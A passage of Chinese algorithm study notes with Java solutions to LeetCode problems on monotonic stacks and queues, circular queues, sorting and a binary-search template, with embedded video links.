}\n\n  int[] leftFirstGreater(int[] nums) {\n    Stack<Integer> stack = new Stack();\n    int[] res = new int[nums.length];\n    for (int i = 0; i < nums.length; i++) {\n      while (!stack.isEmpty() && nums[i] >= nums[stack.peek()]) {\n        stack.pop(); \n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek();\n      stack.push(i);\n    }\n    return res;\n  }\n\n  int[] rightFirstGreater(int[] nums) {\n    Stack<Integer> stack = new Stack();\n    int[] res = new int[nums.length];\n    for (int i = nums.length - 1; i >= 0; i--) {\n      while (!stack.isEmpty() && nums[i] > nums[stack.peek()]) {\n        stack.pop(); \n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek();\n      stack.push(i);\n    }\n    return res;\n  } \n\n}\n```\n\n#### 例题5: 柱状图中最大的矩形\n[柱状图中最大的矩形](https://leetcode.cn/problems/largest-rectangle-in-histogram/)\n\n给定 n 个非负整数，用来表示柱状图中各个柱子的高度。每个柱子彼此相邻，且宽度为 1 。\n\n求在该柱状图中，能够勾勒出来的矩形的最大面积。\n\n示例 1:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220526152849.png)\n```txt\n输入：heights = [2,1,5,6,2,3]\n输出：10\n解释：最大的矩形为图中红色区域，面积为 10\n```\n\n代码:\n```java\nclass Solution {\n  public int largestRectangleArea(int[] heights) {\n    int[] leftFirstLess = leftFirstLess(heights);\n    int[] rightFirstLess = rightFirstLess(heights);\n    int ans = Integer.MIN_VALUE;\n    for (int i = 0; i < heights.length; i++) {\n      int left = leftFirstLess[i] == -1 ? 0 : leftFirstLess[i] + 1;\n      int right = rightFirstLess[i] == -1 ? heights.length - 1 : rightFirstLess[i] - 1;\n      int width = right - left + 1; \n      ans = Math.max(ans, width * heights[i]); \n    }\n    return ans;\n  }\n\n  int[] leftFirstLess(int[] nums) {\n    Stack<Integer> stack = new Stack();\n    int[] res = new int[nums.length];\n    for (int i = 0; i < nums.length; i++) {\n      while (!stack.isEmpty() && nums[i] <= nums[stack.peek()]) {\n        stack.pop();\n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek();\n      stack.push(i);\n    }\n    return res;\n  }\n\n  int[] rightFirstLess(int[] nums) {\n    Stack<Integer> stack = new Stack();\n    int[] res = new int[nums.length];\n    for (int i = nums.length - 1; i >= 0; i--) {\n      while (!stack.isEmpty() && nums[i] <= nums[stack.peek()]) {\n        stack.pop();\n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek();\n      stack.push(i);\n    }\n    return res;\n  }\n  \n}\n```\n\n### 适用场景二\n这种场景用下面几个例题来说明\n\n#### 例题1: 移掉 K 位数字\n给你一个以字符串表示的非负整数 num 和一个整数 k ，移除这个数中的 k 位数字，使得剩下的数字最小。请你以字符串形式返回这个最小的数字。\n\n示例 1 ：\n```txt\n输入：num = \"1432219\", k = 3\n输出：\"1219\"\n解释：移除掉三个数字 4, 3, 和 2 形成一个新的最小的数字 1219 。\n```\n\n示例 2 ：\n```txt\n输入：num = \"10200\", k = 1\n输出：\"200\"\n解释：移掉首位的 1 剩下的数字为 200. 注意输出不能有任何前导零。\n```\n\n##### 分析\n\n视频讲解:\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/qWL2KS_Hxic\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n```java\nclass Solution {\n  public String removeKdigits(String num, int k) {\n    Stack<Character> stack = new Stack();\n    char[] numChar = num.toCharArray();\n    for (int i = 0; i < numChar.length; i++) {\n      while (!stack.isEmpty() && k >  0 && numChar[i] < stack.peek()) {\n        stack.pop();\n        k--;\n      }\n      stack.push(numChar[i]);\n    }\n    while (k != 0) {\n      stack.pop();\n      k--;\n    }\n    StringBuffer sb = new StringBuffer();\n    while (!stack.isEmpty()) {\n      sb.append(stack.pop());\n    }\n    for (int i = sb.length() - 1; i >= 0; i--) {\n      if (sb.charAt(i) == '0') {\n        sb.deleteCharAt(i);\n      } else {\n        break;\n      }\n    }\n    if (sb.length() == 0) {\n      return \"0\";\n    }\n    return sb.reverse().toString();\n  }\n}\n```\n\n#### 例题2: 去除重复字母\n[去除重复字母](https://leetcode.cn/problems/remove-duplicate-letters/)\n\n给你一个字符串 s ，请你去除字符串中重复的字母，使得每个字母只出现一次。需保证 返回结果的字典序最小（要求不能打乱其他字符的相对位置）。\n\n示例 1：\n```txt\n输入：s = \"bcabc\"\n输出：\"abc\"\n```\n\n示例 2：\n```txt\n输入：s = \"cbacdcbc\"\n输出：\"acdb\"\n```\n\n##### 分析\n视频讲解:\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/QpZFxXa-hnE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public String removeDuplicateLetters(String s) {\n    HashMap<Character, Integer> map = new HashMap();\n    char[] ch = s.toCharArray();\n    for (int i = 0; i < ch.length; i++) {\n      if (map.containsKey(ch[i])) {\n        map.put(ch[i], map.get(ch[i]) + 1); \n      } else {\n        map.put(ch[i], 1);\n      }\n    }\n    Stack<Character> stack = new Stack();\n    boolean[] visited = new boolean[26];\n    for (int i = 0; i < ch.length; i++) {\n      if (visited[ch[i] - 'a']) {\n        map.put(ch[i], map.get(ch[i]) - 1);\n        continue;\n      }\n      while (!stack.isEmpty() && map.get(stack.peek()) != 1 && ch[i] < stack.peek()) {\n        map.put(stack.peek(), map.get(stack.peek()) - 1);\n        visited[stack.peek() - 'a'] = false;\n        stack.pop();\n      }\n      visited[ch[i] - 'a'] = true;\n      stack.push(ch[i]);\n    }\n    \n    StringBuffer sb = new StringBuffer();\n    while (!stack.isEmpty()) {\n      sb.append(stack.pop());\n    }\n    return sb.reverse().toString();\n\n  }\n\n}\n```\n\n## 队列\n### 设计循环队列\n例题： [设计循环队列](https://leetcode.cn/problems/design-circular-queue/)\n\n设计你的循环队列实现。 循环队列是一种线性数据结构，其操作表现基于 FIFO（先进先出）原则并且队尾被连接在队首之后以形成一个循环。它也被称为“环形缓冲器”。\n\n循环队列的一个好处是我们可以利用这个队列之前用过的空间。在一个普通队列里，一旦一个队列满了，我们就不能插入下一个元素，即使在队列前面仍有空间。但是使用循环队列，我们能使用这些空间去存储新的值。\n\n你的实现应该支持如下操作：\n- MyCircularQueue(k): 构造器，设置队列长度为 k 。\n- Front: 从队首获取元素。如果队列为空，返回 -1 。\n- Rear: 获取队尾元素。如果队列为空，返回 -1 。\n- enQueue(value): 向循环队列插入一个元素。如果成功插入则返回真。\n- deQueue(): 从循环队列中删除一个元素。如果成功删除则返回真。\n- isEmpty(): 检查循环队列是否为空。\n- isFull(): 检查循环队列是否已满。\n\n示例：\n```txt\nMyCircularQueue circularQueue = new MyCircularQueue(3); // 设置长度为 3\ncircularQueue.enQueue(1);  // 返回 true\ncircularQueue.enQueue(2);  // 返回 true\ncircularQueue.enQueue(3);  // 返回 true\ncircularQueue.enQueue(4);  // 返回 false，队列已满\ncircularQueue.Rear();  // 返回 3\ncircularQueue.isFull();  // 返回 true\ncircularQueue.deQueue();  // 返回 true\ncircularQueue.enQueue(4);  // 返回 true\ncircularQueue.Rear();  // 返回 4\n```\n\n#### 分析\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220526221306.png)\n\n该题难点在于如何设计循环队列初始时front与rear的指向以及如何判断队列为空或满\n\n代码：\n```java\nclass MyCircularQueue {\n  Integer[] items;\n  int head;\n  int tail;\n  int k;\n  \n  public MyCircularQueue(int k) {\n    items = new Integer[k];\n    head = 0;\n    tail = 0;\n    this.k = k;\n  }\n  \n  public boolean enQueue(int value) {\n    if (isFull()) return false;\n    items[tail] = value;\n    tail = (tail + 1) % k;\n    return true;\n  }\n  \n  public boolean deQueue() {\n    if (isEmpty()) return false;\n    items[head] = null;\n    head = (head + 1) % k;\n    return true;\n  }\n  \n  public int Front() {\n    if (isEmpty()) {\n      return -1;\n    }\n    return items[head];\n  }\n  \n  public int Rear() {\n    if (isEmpty()) {\n      return -1;\n    }\n    return items[(tail - 1 + k) % k]; \n  }\n  \n  public boolean isEmpty() {\n    return head == tail && items[head] == null;\n  }\n  \n  public boolean isFull() {\n    return head == tail && items[head] != null;\n  }\n}\n```\n\n### 用队列实现栈\n例题：[用队列实现栈](https://leetcode.cn/problems/implement-stack-using-queues/) \n\n分析：https://leetcode.cn/problems/implement-stack-using-queues/solution/yong-dui-lie-shi-xian-zhan-by-leetcode-solution/\n\n代码：\n```java\nclass MyStack {\n\n  Deque<Integer> deque1;\n  Deque<Integer> deque2;\n\n  public MyStack() {\n    deque1 = new LinkedList();\n    deque2 = new LinkedList();\n  }\n  \n  public void push(int x) {\n    if (deque1.isEmpty()) {\n      deque1.add(x);\n      transfer(deque2, deque1);\n    } else {\n      deque2.add(x);\n      transfer(deque1, deque2);\n    }\n  }\n  \n  private void transfer(Deque a, Deque b) {\n    while (!a.isEmpty()) {\n      b.add(a.poll());\n    }\n  }\n  \n  public int pop() {\n    if (deque1.isEmpty()) {\n      return deque2.poll();\n    } \n    return deque1.poll();\n  }\n  \n  public int top() {\n    if (deque1.isEmpty()) {\n      return deque2.peek();\n    } \n    return deque1.peek();\n  }\n  \n  public boolean empty() {\n    return deque1.isEmpty() && deque2.isEmpty();\n  }\n}\n```\n\n## 单调队列\n<div class=\"container\">\n  <iframe src=\"https://docs.google.com/document/d/e/2PACX-1vTXVQTof9bfXfioACZ9_UyYv4_JREankuTIlwD2Pz60geTts3dxM0aKiwRpkyyU4taXIkCW9gSTQI2O/pub?embedded=true\"></iframe>\n</div>\n### 模版\n```java\npublic int[] maxSlidingWindow(int[] nums, int k) {\n  Deque<Integer> deque = new ArrayDeque();\n  int[] res = new int[nums.length - k + 1];\n  for (int i = 0; i < nums.length; i++) {\n    // 窗口标识\n    int startWindowIndex = i - k + 1;\n\n    // 左出q，保证窗口大小为k-1\n    while (!deque.isEmpty() && i - deque.peekFirst() >= k){\n      deque.pollFirst();\n    }\n\n    // 右出q，保证为递增队列\n    while (!deque.isEmpty() && nums[deque.peekLast()] <= nums[i]) {\n      deque.pollLast();\n    }\n\n    // 进q，此时q.size == k\n    deque.offerLast(i);\n\n    // 此时q队首为此窗口的最大值\n    if (startWindowIndex >= 0) res[startWindowIndex] = nums[deque.peekFirst()];\n  }\n  return res;\n}\n```\n\n### 例题1: 滑动窗口最大值\n[滑动窗口最大值](https://leetcode.cn/problems/sliding-window-maximum/)\n\n给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。\n\n返回 滑动窗口中的最大值 。\n\n示例 1：\n```txt\n输入：nums = [1,3,-1,-3,5,3,6,7], k = 3\n输出：[3,3,5,5,6,7]\n解释：\n滑动窗口的位置                最大值\n---------------               -----\n[1  3  -1] -3  5  3  6  7       3\n 1 [3  -1  -3] 5  3  6  7       3\n 1  3 [-1  -3  5] 3  6  7       5\n 1  3  -1 [-3  5  3] 6  7       5\n 1  3  -1  -3 [5  3  6] 7       6\n 1  3  -1  -3  5 [3  6  7]      7\n```\n\n**代码：**\n```java\nclass Solution {\n  public int[] maxSlidingWindow(int[] nums, int k) {\n    Deque<Integer> deque = new ArrayDeque();\n    int[] res = new int[nums.length - k + 1];\n    for (int i = 0; i < nums.length; i++) {\n      int startWindowIndex = i - k + 1;\n      while (!deque.isEmpty() && i - deque.peekFirst() >= k){\n        deque.pollFirst();\n      }\n      while (!deque.isEmpty() && nums[deque.peekLast()] <= nums[i]) {\n        deque.pollLast();\n      }\n      deque.offerLast(i);\n      if (startWindowIndex >= 0) res[startWindowIndex] = nums[deque.peekFirst()];\n    }\n    return res;\n  }\n}\n```\n\n# 排序\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/dzyD4PS9w9Q\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/itFMGehVi30\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/bxiul-IrPEk\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1gPxamLqyi-HClqEg7ca1jqJwNMI08DOZ/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n## 模版\n[排序数组](https://leetcode.cn/problems/sort-an-array/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718104009.png)\n\n### 冒泡排序\n代码：\n```java\nclass Solution {\n  public int[] sortArray(int[] nums) {\n    bubbleSort(nums);\n    return nums;\n  }\n\n  void bubbleSort(int[] nums) {\n    int n = nums.length;\n    for (int i = 0; i < n - 1; i++) {\n      for (int j = i + 1; j < n; j++) {\n        if (nums[i] > nums[j]) {\n          int temp = nums[i];\n          nums[i] = nums[j];\n          nums[j] = temp;\n        }\n      }\n    }\n  }\n}\n```\n\n### 选择排序\n```java\nclass Solution {\n  public int[] sortArray(int[] nums) {\n    selectionSort(nums);\n    return nums;\n  }\n\n  void selectionSort(int[] nums) {\n    int n = nums.length;\n    for (int i = 0; i < nums.length - 1; i++) {\n      int minIndex = i;\n      for (int j = i + 1; j < nums.length; j++) {\n        if (nums[minIndex] > nums[j]) {\n          minIndex = j;\n        }\n      }\n      if (minIndex != i) {\n        int temp = nums[i];\n        nums[i] = nums[minIndex];\n        nums[minIndex] = temp;\n      }\n    }\n  }\n  \n}\n```\n\n### 插入排序\n```java\nclass Solution {\n  public int[] sortArray(int[] nums) {\n    insertionSort(nums);\n    return nums;\n  }\n  \n  void insertionSort(int[] nums) {\n    int n = nums.length;\n    for (int i = 0; i < n; i++) {\n      int temp = nums[i];\n      int j = i;\n      while (j > 0 && nums[j - 1] > temp) {\n        nums[j] = nums[j - 1];\n        j--;\n      }\n      nums[j] = temp;\n    }\n  }\n}\n```\n\n### 快速排序\n可以使用滑动窗口来实现。移动窗口时，要保证窗口内的元素都是大于或等于pivot元素\n```java\nclass Solution {\n  public int[] sortArray(int[] nums) {\n    quickSort(nums, 0, nums.length - 1);\n    return nums;\n  }\n  \n  int partition(int[] nums, int begin, int end) {\n    int left = begin + 1, right = begin + 1;\n    while (right <= end) {\n      right++;\n      if (nums[right - 1] < nums[begin]) {\n        int temp = nums[right - 1];\n        nums[right - 1] = nums[left];\n        nums[left] = temp;\n\n        left++;\n      }\n    }\n    int temp = nums[left - 1];\n    nums[left - 1] = nums[begin];\n    nums[begin] = temp;\n\n    return left - 1;\n  }\n\n  void quickSort(int[] nums, int begin, int end) {\n    if (begin >= end) {\n      return;\n    }\n    int p = partition(nums, begin, end);\n    quickSort(nums, begin, p - 1); \n    quickSort(nums, p + 1, end); \n  }\n}\n```\n\n### 归并排序\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718153140.png)\n\n```java\nclass Solution {\n  public int[] sortArray(int[] nums) {\n    return mergeSort(nums, 0, nums.length - 1);\n  }\n  \n  int[] mergeSort(int[] nums, int begin, int end) {\n    return devide(nums, begin, end);\n  }\n\n  int[] devide(int[] nums, int left, int right) {\n    if (left >= right) return new int[]{nums[left]};\n    int mid = left + (right - left) / 2;\n    int[] leftResult = devide(nums, left, mid);\n    int[] rightResult = devide(nums, mid + 1, right);\n    return merge(leftResult, rightResult);\n  }\n\n  int[] merge(int[] left, int[] right) {\n    int[] res = new int[left.length + right.length];\n    int i = 0, j = 0, k = 0;\n    while (i < left.length && j < right.length) {\n      if (left[i] <= right[j]) res[k++] = left[i++];\n      else res[k++] = right[j++];\n    } \n    while (i < left.length) res[k++] = left[i++];\n    while (j < right.length) res[k++] = right[j++];\n    return res;\n  }\n}\n```\n\n# 搜索\n## 二分搜索\n视频：\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Smu6LsYERJg\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/nrBMGE0KtzQ\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n文字版：https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/solution/lan-hong-hua-fen-fa-dan-mo-ban-miao-sha-e7r40/\n\n二分搜索有两种定义：\n- 第一种：在一个有序的数组中折半查找一个数\n- 第二种：在一个有序的`boolean function f(v)`中找到转折点\n  - 有序的：表示$f(v_i) = true, i <= k 且 f(v_j) = false, j > k$\n  - 转折点：假如$f(v_k) = true 且 f(v_(k+1)) = false$, 则$v_k$与$v_(k+1)$为转折点\n\n例如: 假如`f(0)=f(1)=...=f(3)=true,f(4)=f(5)=..=f(7)=false`, 则此时`3`与`4`为转折点\n\n| v    | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 |\n|------|---|---|---|---|---|---|---|---|\n| f(v) | T | T | T | T | F | F | F | F |\n\n其实二分搜索的第一种定义就是第二种的定义的一种特殊情况\n\n### 二分搜索模版\n```java\n// 初始化时left为列表的左边界-1，right为列表的右边界+1\nint binarySearch(int left, int right) {\n  while(left + 1 != right) {\n    int mid = left + (right - left) / 2;\n    if (f(mid) == true) {\n      left = mid;\n    } else if (f(mid) == false){\n      right = mid;\n    }\n  }\n  return left;\n}\n```\n\n关键点：\n- 无论什么时候，`f(left)`都是为true, `f(right)`都是为false\n- 最后返回left还是right，看你是想要获取哪个转折点。据需求而定\n- 要进行二分查找时，left的值为列表的左边界-1，right为列表的右边界+1\n\n### 解题流程\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220520163540.png)\n\n### 例题\n#### 例题1: 猜数字大小\n[猜数字大小](https://leetcode.cn/problems/guess-number-higher-or-lower/)\n\n猜数字游戏的规则如下：\n\n每轮游戏，我都会从 1 到 n 随机选择一个数字。 请你猜选出的是哪个数字。\n如果你猜错了，我会告诉你，你猜测的数字比我选出的数字是大了还是小了。\n你可以通过调用一个预先定义好的接口 int guess(int num) 来获取猜测结果，返回值一共有 3 种可能的情况（-1，1 或 0）：\n\n- -1：我选出的数字比你猜的数字小 pick < num\n- 1：我选出的数字比你猜的数字大 pick > num\n- 0：我选出的数字和你猜的数字一样。恭喜！你猜对了！pick == num\n返回我选出的数字。\n\n示例 1：\n```\n输入：n = 10, pick = 6\n输出：6\n```\n\n代码：\n```java\n/** \n * Forward declaration of guess API.\n * @param  num   your guess\n * @return \t     -1 if num is lower than the guess number\n *\t\t\t      1 if num is higher than the guess number\n *               otherwise return 0\n * int guess(int num);\n */\npublic class Solution extends GuessGame {\n  public int guessNumber(int n) {\n    return binarySearch(0, (long) n + 1);\n  }\n  \n  int binarySearch(int left,  long right) {\n    while((long)left + 1 != right) {\n      int mid = left + (int)((right - left) / 2);\n      if (guess(mid) == -1) {\n        right = mid;\n      } else if (guess(mid) == 1 || guess(mid) == 0){\n        left = mid;\n      }\n    }\n    return left;\n  }\n}\n\n```\n\n#### 例题2: x 的平方根\n[x 的平方根 ](https://leetcode.cn/problems/sqrtx/)\n\n给你一个非负整数 x ，计算并返回 x 的 算术平方根 。\n\n由于返回类型是整数，结果只保留 整数部分 ，小数部分将被 舍去 。\n\n注意：不允许使用任何内置指数函数和算符，例如 pow(x, 0.5) 或者 `x ** 0.5`。\n\n示例 1：\n```txt\n输入：x = 4\n输出：2\n```\n\n示例 2：\n```txt\n输入：x = 8\n输出：2\n解释：8 的算术平方根是 2.82842..., 由于返回类型是整数，小数部分将被舍去。\n```\n\n代码：\n```java\nclass Solution {\n    public int mySqrt(int x) {\n        return binarySearch(-1, (long)x + 1, x);\n    }\n    \n    int binarySearch(int left, long right, int x) {\n        while ((long)left + 1 != right) {\n            int mid = left + (int) ((right - left) / 2);\n            if (f(mid, x)) {\n                left = mid;\n            } else {\n                right = mid;\n            }\n        }\n        return left;\n    }\n    \n    boolean f(int index, int x) {\n        if ((long)index * index <= x) {\n            return true;\n        }\n        return false;\n    }\n}\n```\n\n#### 例题3: 第一个错误的版本\n[第一个错误的版本](https://leetcode.cn/problems/first-bad-version/)\n\n你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。\n\n假设你有 n 个版本 [1, 2, ..., n]，你想找出导致之后所有版本出错的第一个错误的版本。\n\n你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。\n\n示例 1：\n```txt\n输入：n = 5, bad = 4\n输出：4\n解释：\n调用 isBadVersion(3) -> false \n调用 isBadVersion(5) -> true \n调用 isBadVersion(4) -> true\n所以，4 是第一个错误的版本。\n```\n\n示例 2：\n```\n输入：n = 1, bad = 1\n输出：1\n```\n\n代码:\n```java\n/* The isBadVersion API is defined in the parent class VersionControl.\n      boolean isBadVersion(int version); */\n\npublic class Solution extends VersionControl {\n    public int firstBadVersion(int n) {\n       return binarySearch(0, (long)n + 1);\n    }\n\n    int binarySearch(int left, long right) {\n        while((long)left + 1 != right) {\n            int mid = left + (int) ((right - left) / 2);\n            if (isBadVersion(mid)) {\n                right = mid;\n            } else {\n                left = mid;\n            }\n        }\n        return (int)right;\n    }\n    \n}\n```\n\n#### 例题4: 寻找旋转排序数组中的最小值\n[寻找旋转排序数组中的最小值](https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array/)\n\n已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：\n- 若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]\n- 若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]\n注意，数组 [a[0], a[1], a[2], ..., a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], ..., a[n-2]] 。\n\n给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。\n\n你必须设计一个时间复杂度为 O(log n) 的算法解决此问题。\n\n示例 1：\n```txt\n输入：nums = [3,4,5,1,2]\n输出：1\n解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。\n```\n\n示例 2：\n```txt\n输入：nums = [4,5,6,7,0,1,2]\n输出：0\n解释：原数组为 [0,1,2,4,5,6,7] ，旋转 4 次得到输入数组。\n```\n\n示例 3：\n```txt\n输入：nums = [11,13,15,17]\n输出：11\n解释：原数组为 [11,13,15,17] ，旋转 4 次得到输入数组。\n```\n\n代码:\n```java\nclass Solution {\n  public int findMin(int[] nums) {\n    int ansIndex = binarySearch(0, nums.length, nums);\n    if (ansIndex == nums.length) {\n      return nums[0];\n    }\n    return nums[ansIndex];\n  }\n\n  int binarySearch(int left, int right, int[] nums) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (nums[mid] >= nums[0]) {\n        left = mid;\n      } else {\n        right = mid;\n      }\n    }\n    return right;\n  }\n}\n```\n\n#### 例题5: 寻找旋转排序数组中的最小值 II\n[寻找旋转排序数组中的最小值 II](https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array-ii/)\n\n已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,4,4,5,6,7] 在变化后可能得到：\n- 若旋转 4 次，则可以得到 [4,5,6,7,0,1,4]\n- 若旋转 7 次，则可以得到 [0,1,4,4,5,6,7]\n注意，数组 [a[0], a[1], a[2], ..., a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], ..., a[n-2]] 。\n\n给你一个可能存在 **重复** 元素值的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。\n\n你必须尽可能减少整个过程的操作步骤。\n\n示例 1：\n```txt\n输入：nums = [1,3,5]\n输出：1\n```\n\n示例 2：\n```txt\n输入：nums = [2,2,2,0,1]\n输出：0\n```\n\n代码：\n```java\nclass Solution {\n  public int findMin(int[] nums) {\n    // 使其符合二分查找模版 \n    int i = nums.length - 1;\n    while (i > 0 && nums[i] == nums[0]) {\n        nums[i--] = nums[0] - 1;\n        if (i == 0) {\n          return nums[0]; \n        }\n    }\n    if (nums[0] < nums[i]) {\n      return nums[0];\n    }\n    int ansIndex = binarySearch(0, nums.length, nums);\n    if (ansIndex == nums.length) {\n      return nums[0];\n    }\n    return nums[ansIndex];\n  }\n\n  int binarySearch(int left, int right, int[] nums) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (nums[mid] >= nums[0]) {\n        left = mid;\n      } else {\n        right = mid;\n      }\n    }\n    return right;\n  }\n \n}\n```\n\n#### 例题6: 在排序数组中查找元素的第一个和最后一个位置\n[在排序数组中查找元素的第一个和最后一个位置](https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/)\n\n给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。\n\n如果数组中不存在目标值 target，返回 [-1, -1]。\n\n进阶：\n- 你可以设计并实现时间复杂度为 O(log n) 的算法解决此问题吗？\n\n示例 1：\n```txt\n输入：nums = [5,7,7,8,8,10], target = 8\n输出：[3,4]\n```\n\n示例 2：\n```txt\n输入：nums = [5,7,7,8,8,10], target = 6\n输出：[-1,-1]\n```\n\n示例 3：\n```txt\n输入：nums = [], target = 0\n输出：[-1,-1]\n```\n\n代码:\n```java\nclass Solution {\n  public int[] searchRange(int[] nums, int target) {\n    if (nums.length == 0) return new int[]{-1, -1};\n    int left = binarySearch1(-1, nums.length, nums, target);\n    if (left == nums.length || nums[left] != target) {\n      left = -1; \n      return new int[]{-1, -1};\n    }\n    int right = binarySearch2(-1, nums.length, nums, target);\n    return new int[]{left, right};\n  }\n\n  int binarySearch1(int left, int right, int[] nums, int target) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (nums[mid] < target) {\n        left = mid;\n      } else {\n        right = mid;\n      }\n    } \n    return right;\n  }\n\n  int binarySearch2(int left, int right, int[] nums, int target) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (nums[mid] <= target) {\n        left = mid;\n      } else {\n        right = mid;\n      }\n    } \n    return left;\n  }\n  \n}\n```\n\n#### K-th object problems\nK-th object problems问题可以归纳为：有一堆objects，让你找出将这些objects按其某属性A的值排序后的第k个object的属性值\n\n这类问题的解题步骤：\n1. 列出所有可能解：object的属性A的所有可能值\n2. 找到boolean function f(v)能把所有可能解划分成2部分：这里function为，将这些objects排好序后，如果位于属性值v前面的object个数大于等于k个，则返回true，反之，返回false\n\n##### 例题7: 乘法表中第k小的数\n[乘法表中第k小的数](https://leetcode.cn/problems/kth-smallest-number-in-multiplication-table/)\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/mUOuMmt5gEY\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n几乎每一个人都用 乘法表。但是你能在乘法表中快速找到第k小的数字吗？\n\n给定高度m 、宽度n 的一张 m * n的乘法表，以及正整数k，你需要返回表中第k 小的数字。\n\n例 1：\n```txt\n输入: m = 3, n = 3, k = 5\n输出: 3\n解释: \n乘法表:\n1\t2\t3\n2\t4\t6\n3\t6\t9\n\n第5小的数字是 3 (1, 2, 2, 3, 3).\n```\n\n例 2：\n```txt\n输入: m = 2, n = 3, k = 6\n输出: 6\n解释: \n乘法表:\n1\t2\t3\n2\t4\t6\n\n第6小的数字是 6 (1, 2, 2, 3, 4, 6).\n```\n\n###### 题目分析\n1. 这一堆objects就是乘法表中元素\n2. 属性：乘法表中元素的大小值\n3. 所有可能解是`[1, m*n]`;\n4. `boolean f(v)`是将objects按大小排好序后，如果大小小于value的个数大于等于k，则返回true，反之，返回false\n\n代码：\n```java\nclass Solution {\n  public int findKthNumber(int m, int n, int k) {\n    return binearySearch(0, m * n + 1, m, n, k);\n  }\n\n  // 如果矩阵中元素小于value的个数大于等于k，则返回true，反之，返回false\n  boolean f(int m, int n, int k, int value) {\n    int cnt = 0;\n    for (int i = 1; i <= m; i++) {\n      cnt += Math.min(value / i, n);\n    }\n    return cnt >= k;\n  }\n\n  int binearySearch(int left, int right, int m, int n, int k) {\n    while (left + 1 != right) {\n      int mid = left + (right - left) / 2;\n      if (f(m, n, k, mid)) {\n        right = mid;\n      } else {\n        left = mid;\n      }\n    }\n    return right;\n  }\n}\n```\n\n##### 例题8: 第 N 个神奇数字\n[第 N 个神奇数字](https://leetcode.cn/problems/nth-magical-number/)\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/mwIge6NXAyQ\" title=\"YouTube video player\" 